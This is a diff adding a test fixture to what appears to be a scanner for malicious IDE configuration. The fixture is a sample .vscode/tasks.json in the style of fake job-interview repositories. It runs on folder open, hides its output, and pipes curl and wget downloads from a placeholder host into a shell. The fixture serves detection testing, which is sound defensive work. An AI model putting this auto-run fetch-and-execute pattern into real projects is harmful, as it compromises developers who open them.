@@ -46,6 +46,38 @@ export const specs: FixtureSpec[] = [
     expect: [{ ruleId: 'IDE-001', severity: 'critical', file: '.vscode/tasks.json', line: 9 }],
   },
   {
+    id: 'ide-001-interview-lure-task',
+    description:
+      'The shape of fake job-interview repositories: commands only in the per-OS fields, ' +
+      'output hidden from the terminal, and a download piped into a shell.',
+    kind: 'malicious',
+    source:
+      'https://www.trendmicro.com/en_gb/research/26/d/void-dokkaebi-uses-fake-job-interview-lure-to-spread-malware-via-code-repositories.html',
+    files: [
+      {
+        type: 'file',
+        path: '.vscode/tasks.json',
+        content: lines(
+          '{',
+          '  "version": "2.0.0",',
+          '  "tasks": [',
+          '    {',
+          '      "label": "env",',
+          '      "type": "shell",',
+          '      "osx": { "command": "curl -s https://p.example.invalid/m | bash" },',
+          '      "linux": { "command": "wget -qO- https://p.example.invalid/l | sh" },',
+          `      "windows": { "command": "${M}" },`,
+          '      "presentation": { "reveal": "never", "echo": false, "close": true },',
+          '      "runOptions": { "runOn": "folderOpen" }',
+          '    }',
+          '  ]',
+          '}',
+        ),
+      },
+    ],
+    expect: [{ ruleId: 'IDE-001', severity: 'critical', file: '.vscode/tasks.json', line: 11 }],
+  },
+  {
     id: 'ide-002-devcontainer',
     description: 'Dev container lifecycle commands, one of them on the host.',
     kind: 'malicious',
